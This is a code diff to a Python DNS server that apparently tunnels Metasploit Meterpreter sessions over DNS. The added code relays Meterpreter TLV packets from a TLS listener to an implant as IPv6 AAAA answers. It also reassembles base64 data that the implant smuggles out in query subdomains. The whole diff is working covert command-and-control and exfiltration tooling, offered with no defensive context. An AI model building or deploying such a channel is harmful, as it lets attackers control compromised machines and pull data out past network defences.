@@ -13,6 +13,7 @@ import re
 import ssl
 import Queue
 import copy
+import base64
 
 try:
     from dnslib import *
@@ -53,11 +54,11 @@ class DNSTunnelResponse():
     
         return ''.join([chr(x) for x in lst])
         
-    def __init__(self, data):
+    def __init__(self, data, TLV_REQX, start = 'aaaa'):
         
-        self.ansx = {}  # Block of IPv6 addresses
+        self.ansx = TLV_REQX  # Block of IPv6 addresses
         max_size = 14 * 16
-        cur_seq = 'aaaa'
+        cur_seq = start
         cur_seq1 = DNSTunnelResponse.inc(cur_seq)
         
         # next domain name
@@ -206,35 +207,51 @@ CONNECTED = False
 servers = []
 
 TLV_REQ = {}
-TLV_RES = {}
+TLV_RES = {'rdy': False}
 
 MAX_SIZE = 14 * 16 # Maximum size of DNS reponse (IPv6)
+
+curr_sub_ = "aaaa"
 
 
 def add_meter_request(data):
     global TLV_REQ
-    
-    while bool(TLV_REQ)  :
+    global curr_sub_
+    while 'y' + curr_sub_ not in TLV_REQ:
         time.sleep(0.1)
-        
-    TLV_REQ = DNSTunnelResponse(data).get_ipv6()   
+    print("NEW REQUEST: GOGO! " + curr_sub_)   
+    print " ".join([ hex(ord(ch))[2:] for ch in data ])
+    TLV_REQ = DNSTunnelResponse(data, TLV_REQ, curr_sub_).get_ipv6() 
+    del TLV_REQ['y' + curr_sub_]
     
     return True
     
 def get_meter_response():
-    while not bool(TLV_RES):
+    global TLV_RES
+    zero = 0.0
+    while not bool(TLV_RES['rdy']) and zero < 600:
         time.sleep(0.1)
-    return True
+        zero += 1
+    if 'full_in' in TLV_RES:
+        data = TLV_RES['full_in']
+    else:
+        data = None
+    TLV_RES = {'rdy': False}
+    return data
+
+def xor_bytes(key, data):
+    return ''.join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))
     
 def dns_response(data):
     global CONNECTED
     global LPORT
     global TLV_REQ
     global TLV_RES
+    global curr_sub_
     
     request = DNSRecord.parse(data)
 
-    print(request)
+    print("\n\nINCOMING: ")
 
     reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
 
@@ -258,7 +275,7 @@ def dns_response(data):
     #    reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
 
     if qn.endswith('.' + D) and qtype==QTYPE.AAAA:
-        print ("Connected:" + str(CONNECTED))
+        print ("Connected status:" + str(CONNECTED))
         if not CONNECTED:
             servers.append(ThreadedTCPServer(('', LPORT),MeterBaseRequestHandler))
             thread = threading.Thread(target=servers[-1].serve_forever)  # that thread will start one more thread for each request
@@ -267,13 +284,92 @@ def dns_response(data):
             print("%s server loop running in thread: %s" % (servers[-1].RequestHandlerClass.__name__[:3], thread.name))
             CONNECTED = True
         print("IN REQ: " + qn)
+        
         m = re.match(r"(?P<sub_dom>\w{4})\.g\.(?P<rnd>\d+)\.(?P<client>\w)\." + D, qn)
-        if m and bool(TLV_REQ) and m.group('sub_dom') in TLV_REQ:
-            print(" READY for " + m.group('sub_dom'))
-            for ip in TLV_REQ[m.group('sub_dom')]:
-                reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA(ip)))      
+        mc = re.match(r"(?P<sub_dom>\w{4})\.c\.(?P<rnd>\d+)\.(?P<client>\w)\." + D, qn)
+        if m:
+            mx = m
+        elif mc :
+            mx = mc
         else:
-            print("Bad Request")
+            mx = None
+            
+        if mx and 'y' + mx.group('sub_dom') in TLV_REQ:
+            print "Return WAITING for " + mx.group('sub_dom')
+            reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("fe81:" + hex(ord(curr_sub_[0]))[2:].zfill(2) +"00:" + hex(ord(curr_sub_[1]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[2]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[3]))[2:].zfill(2) +"00:0000:0000:0000")))
+
+            
+        elif mx and mx.group('sub_dom') in TLV_REQ:
+            print("Return DATA for" + mx.group('sub_dom'))
+            for ip in TLV_REQ[mx.group('sub_dom')]:
+                print "\t" + ip
+                reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA(ip)))  
+        elif mx and  mx.group('sub_dom') not in TLV_REQ:
+            #TLV_REQ = {}
+            curr_sub_ = mx.group('sub_dom')
+            TLV_REQ['y' + curr_sub_] = True
+            print("Return WAITING (create) for " + mx.group('sub_dom'))
+            reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("fe81:" + hex(ord(curr_sub_[0]))[2:].zfill(2) +"00:" + hex(ord(curr_sub_[1]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[2]))[2:].zfill(2) +"00:"+ hex(ord(curr_sub_[3]))[2:].zfill(2) +"00:0000:0000:0000"))) 
+            if mc:
+                TLV_RES['rdy'] = True
+        else:
+            m1 = re.match(r"(?P<base64>.*)\.t\.(?P<idx>\d+)\.(?P<client>\w)\." + D, qn)
+            if m1 and 'recieved_in' in TLV_RES:
+                print("INDATA: DATA CAME")
+                base_in = m1.group('base64')
+                index_in = int(m1.group('idx'))
+                
+                base_in = re.sub(r"\.", "", base_in)
+                base_in = re.sub(r"\-", "+", base_in)
+                base_in = re.sub(r"\_", "/", base_in)
+                
+                lnx = len(base_in)
+                
+                print "\nsize: " + str(TLV_RES['size_in']) + " index: " + str(index_in) + " length " + str(lnx) + " base64: " + base_in + "\n";
+                
+                if TLV_RES['size_in'] > 0:
+                    
+                    print "\n old: " + str(TLV_RES['index_last']) + " vs " + str(index_in) + "\n"
+                    
+                    if (index_in <=  TLV_RES['index_last'] and TLV_RES['index_last'] - index_in < 64535):
+                        print "\ndbl\n"
+                     
+                    else:
+                    
+                        TLV_RES['base64'] += base_in
+                        TLV_RES['size_in']  -=  lnx
+                        TLV_RES['index_last'] =  index_in
+                         
+                        print "\nRCecieved " + str(index_in) + ":" + base_in;
+                        
+                    if (TLV_RES['size_in']  == 0):
+                        print "RECIEVED FULL PACKET\n";
+                                
+                        TLV_RES['full_in'] = base64.b64decode(TLV_RES['base64']  + ("=" * (len(TLV_RES['base64']) % 3)));
+                        print TLV_RES['full_in']
+                        TLV_RES['rdy'] = True
+                        print("INDATA: OK, more")
+                    
+                    reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("ffff:0000:0000:0000:0000:f000:0000:0000")))
+
+                else:
+                    print("INDATA: FINISH")
+                    reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("ffff:0000:0000:0000:0000:ff00:0000:0000")))
+            elif m1:
+                reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("ffff:0000:0000:0000:0000:ff00:0000:0000")))    
+            else:
+                m2 = re.match(r"(?P<size>\d+)\.tx\.(?P<rnd>\d+)\.(?P<client>\w)\." + D, qn)
+                if m2:
+                    print("INDATA: HEADER CAME")
+                    TLV_RES['size_in'] = int(m2.group('size'))
+                    TLV_RES['recieved_in'] = 0
+                    TLV_RES['index_last'] = -1
+                    TLV_RES['base64'] =  ""
+                    
+                    print("Ready to get " + str(TLV_RES['size_in']))
+                    reply.add_answer(RR(rname=qn, rtype=QTYPE.AAAA, rclass=1, ttl=TTL, rdata=AAAA("ffff:0000:0000:0000:0000:0000:0000:0000")))
+                else:
+                    print("Bad Request 1")
 
 
     elif qn.endswith(D) and qtype==QTYPE.NS:
@@ -281,7 +377,7 @@ def dns_response(data):
             reply.add_answer(RR(rname=qname, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
     elif qn.endswith(D) and qtype==QTYPE.A:
         reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IP)))
-    print("---- Reply:\n", reply)
+    #print("---- Reply:\n", reply)
     #reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
 
     return reply.pack()
@@ -316,7 +412,8 @@ class MeterBaseRequestHandler(SocketServer.BaseRequestHandler):
         return self.request.sendall(data)
 
     def handle(self):
-        buflen = 256
+        buflen = 25600
+        
         s = ssl.wrap_socket(self.request,
           #keyfile = "server.key",
           ca_certs = "server.crt",
@@ -339,26 +436,56 @@ class MeterBaseRequestHandler(SocketServer.BaseRequestHandler):
         
         #Session
         while True:
-            while True:
-                try:
-                    data = s.recv(buflen)
-                except ssl.SSLError:
-                    data = None
-                    self.shutdown()
-                    s = None
-                    
-
-                if data is None:
-                    print "EMPTY"
-                    break
-                else:
-                    print "Client said {}".format(data)
-                    add_meter_request(data)
-                    return_tlv = get_meter_response()                   
-                    s.write(return_tlv)
-            if s == None:
+            try:
+                data = s.recv(8) # get header
+            except Exception  as e:
+                print "Server ERROR " + str(e)
+                data = None
+                s = None
                 break
+                
+            if data is None:
+                print "EMPTY"
+                time.sleep(1)
+                continue
+            else:
+                # Parse header
+                xor_key = data[:4][::-1]
+                header_length = xor_bytes(xor_key, data[4:8])
+                pkt_length = struct.unpack('>I', header_length)[0] - 4
+                # Get all data 
+                print "   in len: " + str(pkt_length)
+                s.settimeout(20*60)
+                while pkt_length > 0 :
+                    try:
+                        packet = s.recv(pkt_length) # get header
+                        pkt_length -= len(packet)
+                        data += packet  
+                        print "left: " + str(pkt_length)
+                    except Exception  as e:
+                        print "Server ERROR " + str(e)
+                        packet = None
+                        s = None
+                        break
+                # Ready
+                  
+                print "Server said {}".format(" ".join([ hex(ord(ch))[2:] for ch in data ]))
+                add_meter_request(data)
+                return_tlv = get_meter_response()
+                if return_tlv:
+                    print "Client said {}".format(" ".join([ hex(ord(ch))[2:] for ch in return_tlv ]))
+                    try:
+                        s.write(return_tlv)
+                    except Exception  as e:
+                        print "Server ERROR 2 " + str(e)
+                        data = None
+                        s = None
+                        break
+                    print "SENT"
+                
+                time.sleep(2)
 
+            
 class TCPRequestHandler(BaseRequestHandlerDNS):
 
     def get_data(self):
